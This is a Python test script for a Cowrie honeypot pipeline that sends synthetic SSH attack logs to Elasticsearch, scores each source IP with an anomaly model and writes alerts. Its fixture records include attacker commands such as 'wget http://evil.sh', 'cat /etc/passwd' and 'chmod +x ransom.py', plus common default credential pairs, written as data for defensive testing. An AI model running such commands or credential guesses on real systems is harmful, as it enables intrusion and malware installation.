"""
test_pipeline.py
1. Sends test cowrie logs to ES (cowrie-logs index)
2. Reads them back
3. Runs prediction
4. Pushes results to cowrie-alerts
5. Prints a clear pass/fail summary

Usage:
    python test_pipeline.py
    ES_HOST=http://your-ec2-ip:9200 python test_pipeline.py
"""

import os, time, statistics, joblib, pandas as pd
from datetime import datetime, timezone, timedelta
from elasticsearch import Elasticsearch, helpers

ES_HOST      = os.getenv("ES_HOST",      "http://localhost:9200")
SOURCE_INDEX = "cowrie-logs"
ALERT_INDEX  = "cowrie-alerts"
MODEL_PATH   = "models/cowrie_model.pkl"
SCALER_PATH  = "models/cowrie_scaler.pkl"
THRESHOLD    = float(os.getenv("SCORE_THRESHOLD", "0.50"))

FEATURE_COLS = [
    "total_events","unique_sessions","failed_logins","success_logins",
    "unique_usernames","unique_passwords","unique_dst_ports","unique_protocols",
    "commands_executed","files_downloaded","c2_connections","has_payload",
    "avg_session_duration","total_bytes_sent","total_bytes_received",
    "high_severity_events","medium_severity_events","unique_mitre_techniques",
    "unique_attack_types","compromised_count","fail_rate","success_rate",
    "user_reuse_ratio","cmd_per_session","bytes_ratio","threat_score",
    "connection_rate","burst_score",
]

# ── Test logs ──────────────────────────────────────────────────────────────────
def ts(m=0):
    return (datetime.now(timezone.utc) - timedelta(minutes=m)).strftime("%Y-%m-%dT%H:%M:%SZ")

TEST_LOGS = [
    # 46.101.90.205 — brute forcer + c2 + payload → should be ATTACKER
    {"event_id":"T001","session_id":"SA01","timestamp":ts(10),"event_type":"login_attempt","honeypot_id":"hp-eu-01","src_ip":"46.101.90.205","src_port":33140,"dst_ip":"10.0.1.11","dst_port":22,"protocol":"ssh","username":"admin","password":"admin123","login_success":False,"command":None,"command_index":0,"country":"DE","asn":"AS14061","isp":"DigitalOcean","attack_type":"Rootkit","mitre_technique_id":"T1110","mitre_technique_name":"Brute Force","severity":"medium","file_downloaded":"malware.sh","c2_ip":"192.168.1.5","sha256_payload":"abc123","session_duration_sec":350,"bytes_sent":800,"bytes_received":3000,"alert_tag":"compromised_login","false_positive":False},
    {"event_id":"T002","session_id":"SA01","timestamp":ts(9), "event_type":"login_attempt","honeypot_id":"hp-eu-01","src_ip":"46.101.90.205","src_port":33141,"dst_ip":"10.0.1.11","dst_port":22,"protocol":"ssh","username":"root","password":"toor","login_success":False,"command":None,"command_index":0,"country":"DE","asn":"AS14061","isp":"DigitalOcean","attack_type":"Rootkit","mitre_technique_id":"T1110","mitre_technique_name":"Brute Force","severity":"medium","file_downloaded":None,"c2_ip":None,"sha256_payload":None,"session_duration_sec":300,"bytes_sent":600,"bytes_received":2500,"alert_tag":"brute_force","false_positive":False},
    {"event_id":"T003","session_id":"SA02","timestamp":ts(8), "event_type":"login_attempt","honeypot_id":"hp-eu-01","src_ip":"46.101.90.205","src_port":33142,"dst_ip":"10.0.1.11","dst_port":22,"protocol":"ssh","username":"root","password":"password","login_success":True,"command":"wget http://evil.sh","command_index":1,"country":"DE","asn":"AS14061","isp":"DigitalOcean","attack_type":"Rootkit","mitre_technique_id":"T1110","mitre_technique_name":"Brute Force","severity":"high","file_downloaded":"bot.sh","c2_ip":"10.10.10.1","sha256_payload":"def456","session_duration_sec":400,"bytes_sent":900,"bytes_received":4000,"alert_tag":"compromised_login","false_positive":False},
    {"event_id":"T004","session_id":"SA02","timestamp":ts(7), "event_type":"login_attempt","honeypot_id":"hp-eu-01","src_ip":"46.101.90.205","src_port":33143,"dst_ip":"10.0.1.11","dst_port":22,"protocol":"ssh","username":"chef","password":"Juniper1!","login_success":False,"command":None,"command_index":0,"country":"DE","asn":"AS14061","isp":"DigitalOcean","attack_type":"Rootkit","mitre_technique_id":"T1110","mitre_technique_name":"Brute Force","severity":"high","file_downloaded":None,"c2_ip":"10.10.10.1","sha256_payload":None,"session_duration_sec":320,"bytes_sent":610,"bytes_received":2600,"alert_tag":"brute_force","false_positive":False},
    {"event_id":"T005","session_id":"SA03","timestamp":ts(6), "event_type":"login_attempt","honeypot_id":"hp-eu-01","src_ip":"46.101.90.205","src_port":33144,"dst_ip":"10.0.1.11","dst_port":22,"protocol":"ssh","username":"pi","password":"raspberry","login_success":False,"command":None,"command_index":0,"country":"DE","asn":"AS14061","isp":"DigitalOcean","attack_type":"Rootkit","mitre_technique_id":"T1110","mitre_technique_name":"Brute Force","severity":"medium","file_downloaded":None,"c2_ip":None,"sha256_payload":None,"session_duration_sec":290,"bytes_sent":590,"bytes_received":2400,"alert_tag":"brute_force","false_positive":False},

    # 103.124.104.50 — ransomware staging → should be ATTACKER
    {"event_id":"T006","session_id":"SB01","timestamp":ts(20),"event_type":"login_attempt","honeypot_id":"hp-eu-02","src_ip":"103.124.104.50","src_port":41987,"dst_ip":"10.0.1.10","dst_port":22,"protocol":"ssh","username":"www-data","password":"welcome1","login_success":True,"command":"cat /etc/passwd","command_index":1,"country":"CN","asn":"AS45090","isp":"Tencent","attack_type":"Ransomware Staging","mitre_technique_id":"T1486","mitre_technique_name":"Data Encrypted","severity":"high","file_downloaded":"ransom.py","c2_ip":"172.16.0.5","sha256_payload":"fff999","session_duration_sec":431,"bytes_sent":321,"bytes_received":2191,"alert_tag":"compromised_login","false_positive":False},
    {"event_id":"T007","session_id":"SB01","timestamp":ts(19),"event_type":"login_attempt","honeypot_id":"hp-eu-02","src_ip":"103.124.104.50","src_port":41988,"dst_ip":"10.0.1.10","dst_port":22,"protocol":"ssh","username":"www-data","password":"welcome1","login_success":True,"command":"chmod +x ransom.py","command_index":2,"country":"CN","asn":"AS45090","isp":"Tencent","attack_type":"Ransomware Staging","mitre_technique_id":"T1486","mitre_technique_name":"Data Encrypted","severity":"high","file_downloaded":None,"c2_ip":"172.16.0.5","sha256_payload":"fff998","session_duration_sec":400,"bytes_sent":300,"bytes_received":2000,"alert_tag":"compromised_login","false_positive":False},

    # 5.188.206.26 — medium brute force → borderline
    {"event_id":"T008","session_id":"SC01","timestamp":ts(30),"event_type":"login_attempt","honeypot_id":"hp-us-01","src_ip":"5.188.206.26","src_port":60543,"dst_ip":"10.0.2.10","dst_port":22,"protocol":"ssh","username":"postgres","password":"root123","login_success":False,"command":None,"command_index":0,"country":"RU","asn":"AS50673","isp":"Serverius","attack_type":"Lateral Movement","mitre_technique_id":"T1110","mitre_technique_name":"Brute Force","severity":"medium","file_downloaded":None,"c2_ip":None,"sha256_payload":None,"session_duration_sec":41,"bytes_sent":652,"bytes_received":1182,"alert_tag":"brute_force","false_positive":False},
    {"event_id":"T009","session_id":"SC01","timestamp":ts(28),"event_type":"login_attempt","honeypot_id":"hp-us-01","src_ip":"5.188.206.26","src_port":60544,"dst_ip":"10.0.2.10","dst_port":22,"protocol":"ssh","username":"oracle","password":"oracle","login_success":False,"command":None,"command_index":0,"country":"RU","asn":"AS50673","isp":"Serverius","attack_type":"Lateral Movement","mitre_technique_id":"T1110","mitre_technique_name":"Brute Force","severity":"medium","file_downloaded":None,"c2_ip":None,"sha256_payload":None,"session_duration_sec":38,"bytes_sent":640,"bytes_received":1100,"alert_tag":"brute_force","false_positive":False},
    {"event_id":"T010","session_id":"SC02","timestamp":ts(26),"event_type":"login_attempt","honeypot_id":"hp-us-01","src_ip":"5.188.206.26","src_port":60545,"dst_ip":"10.0.2.10","dst_port":22,"protocol":"ssh","username":"admin","password":"admin","login_success":False,"command":None,"command_index":0,"country":"RU","asn":"AS50673","isp":"Serverius","attack_type":"Lateral Movement","mitre_technique_id":"T1110","mitre_technique_name":"Brute Force","severity":"medium","file_downloaded":None,"c2_ip":None,"sha256_payload":None,"session_duration_sec":35,"bytes_sent":620,"bytes_received":1050,"alert_tag":"brute_force","false_positive":False},

    # 8.8.8.8 — light scanner → should be NORMAL
    {"event_id":"T011","session_id":"SD01","timestamp":ts(5),"event_type":"login_attempt","honeypot_id":"hp-us-01","src_ip":"8.8.8.8","src_port":12345,"dst_ip":"10.0.2.10","dst_port":22,"protocol":"ssh","username":"user","password":"pass","login_success":False,"command":None,"command_index":0,"country":"US","asn":"AS15169","isp":"Google","attack_type":"Scanning","mitre_technique_id":"T1046","mitre_technique_name":"Network Scan","severity":"low","file_downloaded":None,"c2_ip":None,"sha256_payload":None,"session_duration_sec":10,"bytes_sent":100,"bytes_received":200,"alert_tag":"brute_force","false_positive":False},
    {"event_id":"T012","session_id":"SD02","timestamp":ts(4),"event_type":"login_attempt","honeypot_id":"hp-us-01","src_ip":"8.8.8.8","src_port":12346,"dst_ip":"10.0.2.10","dst_port":23,"protocol":"telnet","username":"user","password":"pass2","login_success":False,"command":None,"command_index":0,"country":"US","asn":"AS15169","isp":"Google","attack_type":"Scanning","mitre_technique_id":"T1046","mitre_technique_name":"Network Scan","severity":"low","file_downloaded":None,"c2_ip":None,"sha256_payload":None,"session_duration_sec":8,"bytes_sent":90,"bytes_received":180,"alert_tag":"brute_force","false_positive":False},
]

# ── Feature extraction ─────────────────────────────────────────────────────────
def extract_features(logs):
    total = len(logs)
    failed  = sum(1 for l in logs if str(l.get("login_success","")).lower() in ("false","0"))
    success = sum(1 for l in logs if str(l.get("login_success","")).lower() in ("true","1"))
    usernames  = {l.get("username","") for l in logs}
    passwords  = {l.get("password","") for l in logs}
    dst_ports  = {l.get("dst_port") for l in logs if l.get("dst_port")}
    protocols  = {l.get("protocol") for l in logs if l.get("protocol")}
    sessions   = {l.get("session_id") for l in logs if l.get("session_id")}
    mitre_ids  = {l.get("mitre_technique_id") for l in logs if l.get("mitre_technique_id")}
    atk_types  = {l.get("attack_type") for l in logs if l.get("attack_type")}
    cmds       = sum(1 for l in logs if l.get("command"))
    files_dl   = sum(1 for l in logs if l.get("file_downloaded"))
    c2_conns   = sum(1 for l in logs if l.get("c2_ip"))
    has_payload= sum(1 for l in logs if l.get("sha256_payload"))
    high_sev   = sum(1 for l in logs if str(l.get("severity","")).lower()=="high")
    med_sev    = sum(1 for l in logs if str(l.get("severity","")).lower()=="medium")
    comp_count = sum(1 for l in logs if str(l.get("alert_tag","")).lower()=="compromised_login")
    durations  = [float(l.get("session_duration_sec",0)) for l in logs if l.get("session_duration_sec")]
    bytes_sent = sum(float(l.get("bytes_sent",0)) for l in logs)
    bytes_recv = sum(float(l.get("bytes_received",0)) for l in logs)
    avg_dur    = sum(durations)/len(durations) if durations else 0
    fail_rate        = failed/(total+1)
    success_rate     = success/(total+1)
    user_reuse_ratio = 1-(len(usernames)/(failed+1))
    cmd_per_session  = cmds/(len(sessions)+1)
    bytes_ratio      = bytes_sent/(bytes_recv+1)
    threat_score     = (high_sev*2+med_sev+c2_conns*3+files_dl*2+has_payload*2)/(total+1)
    try:
        ts_list = sorted(datetime.fromisoformat(l["timestamp"].replace("Z","+00:00")) for l in logs if l.get("timestamp"))
        dur_min = max((ts_list[-1]-ts_list[0]).total_seconds()/60,1) if len(ts_list)>1 else 1
        conn_rate = total/dur_min
        gaps = [(ts_list[i+1]-ts_list[i]).total_seconds() for i in range(len(ts_list)-1)]
        burst = 1/(statistics.stdev(gaps)+1) if len(gaps)>1 else 0
    except:
        conn_rate, burst = total, 0
    return {
        "total_events":total,"unique_sessions":len(sessions),"failed_logins":failed,
        "success_logins":success,"unique_usernames":len(usernames),"unique_passwords":len(passwords),
        "unique_dst_ports":len(dst_ports),"unique_protocols":len(protocols),"commands_executed":cmds,
        "files_downloaded":files_dl,"c2_connections":c2_conns,"has_payload":has_payload,
        "avg_session_duration":round(avg_dur,2),"total_bytes_sent":bytes_sent,
        "total_bytes_received":bytes_recv,"high_severity_events":high_sev,
        "medium_severity_events":med_sev,"unique_mitre_techniques":len(mitre_ids),
        "unique_attack_types":len(atk_types),"compromised_count":comp_count,
        "fail_rate":round(fail_rate,4),"success_rate":round(success_rate,4),
        "user_reuse_ratio":round(user_reuse_ratio,4),"cmd_per_session":round(cmd_per_session,4),
        "bytes_ratio":round(bytes_ratio,4),"threat_score":round(threat_score,4),
        "connection_rate":round(conn_rate,4),"burst_score":round(burst,4),
    }

# ── Main ───────────────────────────────────────────────────────────────────────
def main():
    print(f"\n{'='*60}")
    print(f"  COWRIE PIPELINE TEST")
    print(f"  ES: {ES_HOST}")
    print(f"{'='*60}\n")

    # STEP 1 — connect
    print("[ STEP 1 ] Connecting to Elasticsearch...")
    es = Elasticsearch(ES_HOST, request_timeout=10)
    try:
        info = es.info()
        print(f"  ✔ Connected — ES version {info['version']['number']}\n")
    except Exception as e:
        print(f"  ✗ Cannot connect: {e}")
        return

    # STEP 2 — send logs
    print(f"[ STEP 2 ] Sending {len(TEST_LOGS)} test logs → [{SOURCE_INDEX}]...")
    actions = [{"_index": SOURCE_INDEX, "_source": log} for log in TEST_LOGS]
    ok, _ = helpers.bulk(es, actions, raise_on_error=False, stats_only=True)
    print(f"  ✔ {ok} docs indexed\n")

    # STEP 3 — wait for ES to index
    print("[ STEP 3 ] Waiting for ES to index docs...")
    time.sleep(3)

    # STEP 4 — read back from ES
    print(f"[ STEP 4 ] Reading logs back from [{SOURCE_INDEX}]...")
    res = es.search(index=SOURCE_INDEX, body={
        "size": 100,
        "sort": [{"timestamp": "asc"}],
        "query": {"match_all": {}}
    })
    hits = res["hits"]["hits"]
    print(f"  ✔ {len(hits)} docs retrieved\n")

    if not hits:
        print("  ✗ No docs found — check your index name")
        return

    # STEP 5 — group by IP
    from collections import defaultdict
    grouped = defaultdict(list)
    for h in hits:
        src = h["_source"]
        grouped[src.get("src_ip","unknown")].append(src)

    # STEP 6 — load model + predict
    print("[ STEP 5 ] Loading model and predicting...")
    model  = joblib.load(MODEL_PATH)
    scaler = joblib.load(SCALER_PATH)
    print(f"  ✔ Model loaded | threshold={THRESHOLD}\n")

    print(f"{'─'*60}")
    print(f"  {'IP':<22} {'LABEL':<12} {'SCORE':>6}  KEY SIGNALS")
    print(f"{'─'*60}")

    alert_docs = []
    results    = []

    for ip, logs in grouped.items():
        f = extract_features(logs)
        X = pd.DataFrame([f])[FEATURE_COLS].fillna(0)
        X_scaled = scaler.transform(X)
        score = float(-model.score_samples(X_scaled)[0])
        label = "attacker" if score >= THRESHOLD else "normal"
        results.append((ip, label, score))

        flag = "🚨" if label == "attacker" else "✔ "
        signals = f"c2={f['c2_connections']} files={f['files_downloaded']} high_sev={f['high_severity_events']} threat={f['threat_score']:.2f}"
        print(f"  {flag} {ip:<20} {label:<12} {score:>6.4f}  {signals}")

        alert_docs.append({
            "_index": ALERT_INDEX,
            "_source": {
                "src_ip": ip,
                "honeypot": "cowrie",
                "prediction": label,
                "anomaly_score": score,
                "@timestamp": datetime.now(timezone.utc).isoformat(),
                **f,
            }
        })

    print(f"{'─'*60}\n")

    # STEP 7 — push alerts
    print(f"[ STEP 6 ] Pushing predictions → [{ALERT_INDEX}]...")
    ok2, _ = helpers.bulk(es, alert_docs, raise_on_error=False, stats_only=True)
    print(f"  ✔ {ok2} alerts pushed\n")

    # STEP 8 — verify alerts landed
    time.sleep(2)
    res2 = es.search(index=ALERT_INDEX, body={"size": 0, "aggs": {
        "by_label": {"terms": {"field": "prediction.keyword"}}
    }})
    buckets = res2["aggregations"]["by_label"]["buckets"]
    print(f"[ STEP 7 ] Verifying alerts in [{ALERT_INDEX}]...")
    for b in buckets:
        print(f"  ✔ {b['key']}: {b['doc_count']} alerts")

    # Summary
    attackers = [r for r in results if r[1]=="attacker"]
    normals   = [r for r in results if r[1]=="normal"]
    print(f"\n{'='*60}")
    print(f"  RESULT: {len(attackers)} attacker(s)  |  {len(normals)} normal")
    for r in attackers: print(f"    🚨 {r[0]:<20} score={r[2]:.4f}")
    for r in normals:   print(f"    ✔  {r[0]:<20} score={r[2]:.4f}")
    print(f"\n  Kibana → http://localhost:5601")
    print(f"  Index  → {ALERT_INDEX}")
    print(f"{'='*60}\n")

if __name__ == "__main__":
    main()